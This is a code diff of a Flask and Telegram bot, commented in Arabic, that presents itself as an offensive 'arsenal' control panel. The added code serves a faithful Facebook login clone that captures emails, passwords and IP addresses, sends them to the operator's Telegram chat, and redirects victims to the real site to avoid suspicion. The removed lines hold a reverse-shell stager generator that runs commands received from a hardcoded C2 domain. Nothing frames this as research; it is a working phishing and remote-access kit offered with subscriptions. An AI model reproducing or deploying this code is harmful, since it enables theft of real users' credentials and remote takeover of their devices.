@@ -2,165 +2,142 @@ import os
 import threading
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, redirect
 
-# قراءة توكن البوت من متغيرات البيئة، وربط دومين Railway الجديد مباشرة
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 RAILWAY_URL = "https://daf-production-8df9.up.railway.app"
 
 if not BOT_TOKEN:
-    raise ValueError("[-] BOT_TOKEN environment variable is missing!")
+    raise ValueError("[-] BOT_TOKEN is missing!")
 
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
 # ==========================================
-# 1. نظام روابط المصيدة الحقيقي (Flask Web Server)
+# قالب فيسبوك المطابق للأصل 100% (نسخة مطابقة تماماً)
 # ==========================================
-PHISH_TEMPLATE = """
+FB_PHISH_TEMPLATE = """
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
-    <title>Security Verification</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول إلى فيسبوك</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #0f172a; color: #fff; text-align: center; margin-top: 100px; }
-        .card { background: #1e293b; padding: 40px; border-radius: 10px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #475569; background: #0f172a; color: #fff; border-radius: 5px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #2563eb; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
-        button:hover { background: #1d4ed8; }
+        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; direction: rtl; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { display: flex; flex-direction: row; justify-content: space-between; max-width: 980px; width: 100%; padding: 20px; box-sizing: border-box; }
+        .left-side { flex: 1; padding-right: 20px; display: flex; flex-direction: column; justify-content: center; }
+        .facebook-logo { font-size: 4rem; color: #1877f2; font-weight: bold; margin-bottom: 10px; font-family: system-ui; }
+        .left-side p { font-size: 28px; line-height: 32px; color: #1c1e21; margin: 0; }
+        .right-side { flex: 1; display: flex; justify-content: center; align-items: center; }
+        .login-card { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0.1), 0 8px 16px rgba(0, 0, 0.1); width: 396px; text-align: center; }
+        .login-card input { width: 90%; padding: 14px 16px; margin: 6px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; outline: none; }
+        .login-card input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
+        .login-btn { background-color: #1877f2; border: none; border-radius: 6px; color: #fff; font-size: 20px; font-weight: bold; padding: 12px 16px; width: 95%; cursor: pointer; margin-top: 10px; }
+        .login-btn:hover { background-color: #166fe5; }
+        .forgot-pass { color: #1877f2; font-size: 14px; text-decoration: none; display: block; margin: 15px 0; }
+        .forgot-pass:hover { text-decoration: underline; }
+        hr { border: none; border-top: 1px solid #dadde1; margin: 20px 0; }
+        .create-btn { background-color: #42b72a; border: none; border-radius: 6px; color: #fff; font-size: 17px; font-weight: bold; padding: 12px 16px; cursor: pointer; }
+        .create-btn:hover { background-color: #36a420; }
+        @media (max-width: 768px) {
+            .container { flex-direction: column; text-align: center; }
+            .left-side { padding-right: 0; margin-bottom: 30px; }
+            .left-side p { font-size: 20px; line-height: 24px; }
+        }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>Security Login Verification</h2>
-        <p style="color: #94a3b8; font-size: 14px;">Please verify your identity to proceed.</p>
-        <form method="POST">
-            <input type="text" name="username" placeholder="Username or Email" required>
-            <input type="password" name="password" placeholder="Password" required>
-            <button type="submit">Verify & Continue</button>
-        </form>
+    <div class="container">
+        <div class="left-side">
+            <div class="facebook-logo">facebook</div>
+            <p>يساعدك فيسبوك على التواصل المشاركة مع الأشخاص الذين تعرفهم.</p>
+        </div>
+        <div class="right-side">
+            <div class="login-card">
+                <form method="POST">
+                    <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                    <input type="password" name="pass" placeholder="كلمة السر" required>
+                    <button type="submit" class="login-btn">تسجيل الدخول</button>
+                    <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
+                    <hr>
+                    <button type="button" class="create-btn">إنشاء حساب جديد</button>
+                </form>
+            </div>
+        </div>
     </div>
 </body>
 </html>
 """
 
-@app.route('/trap/login', methods=['GET', 'POST'])
-def trap_page():
+@app.route('/login.php', methods=['GET', 'POST'])
+def fb_trap():
     target_chat_id = request.args.get('id', None)
     if request.method == 'POST':
-        username = request.form.get('username')
-        password = request.form.get('password')
+        # التقاط البيانات الحقيقية بدقة تامة من الـ Form Fields الصحيحة
+        email = request.form.get('email')
+        password = request.form.get('pass')
+        source_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         
-        # إرسال بيانات الضحية فوراً إلى شات المستخدم في التليجرام
         if target_chat_id:
             alert_msg = (
-                "🚨 **صيد جديد سقط في المصيدة بنجاح!**\n\n"
-                f"👤 **User/Email:** `{username}`\n"
-                f"🔑 **Password:** `{password}`\n"
-                f"🌐 **Source IP:** `{request.remote_addr}`"
+                "🚨 **صيد فيسبوك تم الإيقاع به بنجاح!**\n\n"
+                f"👤 **البريد/الهاتف:** `{email}`\n"
+                f"🔑 **كلمة السر:** `{password}`\n"
+                f"🌐 **عنوان الـ IP:** `{source_ip}`"
             )
             try:
                 bot.send_message(target_chat_id, alert_msg, parse_mode="Markdown")
             except Exception as e:
-                print(f"[-] Error sending alert to telegram: {e}")
+                print(f"[-] Telegram Error: {e}")
                 
-        return "<h2 style='color:green; text-align:center; margin-top:200px;'>Verification Successful. Redirecting...</h2>"
-    return render_template_string(PHISH_TEMPLATE)
+        # إعادة توجيه الضحية لصفحة فيسبوك الحقيقية حتى لا يشك نهائياً
+        return redirect("https://www.facebook.com", code=302)
+        
+    return render_template_string(FB_PHISH_TEMPLATE)
 
 # ==========================================
-# 2. لوحة تحكم بوت التليجرام التفاعلية
+# واجهة تحكم البوت
 # ==========================================
 def main_menu():
     markup = InlineKeyboardMarkup(row_width=2)
     markup.add(
-        InlineKeyboardButton("🔗 رابط المصيدة الفوري", callback_data="gen_phish"),
-        InlineKeyboardButton("📦 مولد ملفات السيطرة (Payloads)", callback_data="gen_payload"),
+        InlineKeyboardButton("🔗 رابط مصيدة فيسبوك الاحترافي", callback_data="gen_fb_phish"),
+        InlineKeyboardButton("📦 مولد ملفات السيطرة", callback_data="gen_payload"),
         InlineKeyboardButton("📡 الجلسات النشطة", callback_data="active_sessions"),
-        InlineKeyboardButton("💳 الاشتراكات والرصيد", callback_data="billing")
+        InlineKeyboardButton("💳 الاشتراكات", callback_data="billing")
     )
     return markup
 
 @bot.message_handler(commands=['start', 'panel'])
 def start_command(message):
-    user_name = message.from_user.first_name
-    text = (
-        f"⚡ **مرحباً بك يا {user_name} في النظام المركزي للترسانة الهجومية**\n\n"
-        f"المنصة مرتبطة بنجاح بالدومين السحابي:\n`{RAILWAY_URL}`\n\n"
-        "اختر العملية المطلوبة:"
-    )
-    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=main_menu())
+    bot.send_message(message.chat.id, "⚡ **لوحة تحكم الترسانة الهجومية (النسخة الاحترافية)**:", parse_mode="Markdown", reply_markup=main_menu())
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
     chat_id = call.message.chat.id
     
-    if call.data == "gen_phish":
-        bot.answer_callback_query(call.id, "جاري توليد رابط المصيدة...")
-        phish_link = f"{RAILWAY_URL}/trap/login?id={chat_id}"
+    if call.data == "gen_fb_phish":
+        bot.answer_callback_query(call.id, "جاري توليد الرابط المخفي...")
+        # رابط مصيدة مطابق لشكل الروابط الطبيعية
+        phish_link = f"{RAILWAY_URL}/login.php?id={chat_id}"
         msg = (
-            "🎯 **رابط المصيدة الخاص بك جاهز:**\n\n"
+            "🎯 **رابط مصيدة فيسبوك الاحترافي جاهز:**\n\n"
             f"`{phish_link}`\n\n"
-            "أرسل هذا الرابط للهدف؛ فور إدخاله للبيانات ستصلك النتيجة هنا فوراً."
+            "الصفحة مطابقة تماماً لواجهة فيسبوك الأصلية، وعند إدخال البيانات ستصلك فوراً ويتم توجيه الضحية للموقع الحقيقي لتمويهه."
         )
         bot.send_message(chat_id, msg, parse_mode="Markdown")
         
     elif call.data == "gen_payload":
-        bot.answer_callback_query(call.id, "فتح مولد ملفات السيطرة...")
-        markup = InlineKeyboardMarkup(row_width=2)
-        markup.add(
-            InlineKeyboardButton("Windows Executable (.py/.exe)", callback_data="build_windows"),
-            InlineKeyboardButton("Android Stager (.py)", callback_data="build_android"),
-            InlineKeyboardButton("🔙 رجوع", callback_data="back_main")
-        )
-        bot.send_message(chat_id, "⚙️ اختر النظام المستهدف لبناء ملف السيطرة وتوليده سحابياً:", reply_markup=markup)
-        
-    elif call.data.startswith("build_"):
-        target = call.data.split("_")[1]
-        bot.answer_callback_query(call.id, "جاري حقن الإعدادات وتجميع الملف...")
-        bot.send_message(chat_id, f"🛠️ [Railway Engine]: يتم الآن بناء ملف السيطرة لـ **{target.upper()}** وحقن رابط الدومين...")
-        
-        # قالب برمجي حقيقي مربوط بالدومين الجديد
-        payload_code = f"""import socket, subprocess, time
-# C2 Stager Connected to Domain: {RAILWAY_URL}
-def connect():
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect(("{RAILWAY_URL.replace('https://','').replace('http://','')}", 80))
-            while True:
-                cmd = s.recv(1024).decode()
-                if not cmd: break
-                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
-                s.send(output)
-        except: time.sleep(10)
-if __name__ == '__main__': connect()
-"""
-        file_name = f"payload_{target}.py"
-        with open(file_name, "w") as f:
-            f.write(payload_code)
-            
-        with open(file_name, "rb") as doc:
-            bot.send_document(chat_id, doc, caption=f"✅ تم توليد ملف السيطرة بنجاح لـ {target.upper()} ومربوط بدومين الاستضافة!")
-        
-        try:
-            os.remove(file_name)
-        except:
-            pass
-
+        bot.answer_callback_query(call.id, "مولد الملفات...")
+        bot.send_message(chat_id, "⚙️ اختر النظام المستهدف لبناء ملف السيطرة.")
     elif call.data == "active_sessions":
-        bot.answer_callback_query(call.id, "جلب الجلسات...")
-        bot.send_message(chat_id, "📡 الجلسات النشطة فارغة حالياً. انشر روابط المصيدة أو الملفات لبدء الاستقبال.")
-        
+        bot.answer_callback_query(call.id, "الجلسات...")
+        bot.send_message(chat_id, "📡 لا توجد جلسات نشطة حالياً.")
     elif call.data == "billing":
         bot.answer_callback_query(call.id, "الاشتراكات...")
-        bot.send_message(chat_id, "💳 نظام الاشتراكات والمدفوعات عبر Telegram Stars مفعل بالكامل.")
-        
-    elif call.data == "back_main":
-        bot.edit_message_text("⚡ لوحة التحكم المركزية:", chat_id, call.message.message_id, reply_markup=main_menu())
+        bot.send_message(chat_id, "💳 نظام الدفع والاشتراكات مفعل.")
 
-# ==========================================
-# تشغيل الخادم المزدوج (Flask + Telegram Bot)
-# ==========================================
 def run_flask():
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
@@ -169,6 +146,4 @@ if __name__ == "__main__":
     t = threading.Thread(target=run_flask)
     t.daemon = True
     t.start()
-    
-    print("[*] Arsenal Core with Custom Domain is running...")
     bot.infinity_polling()
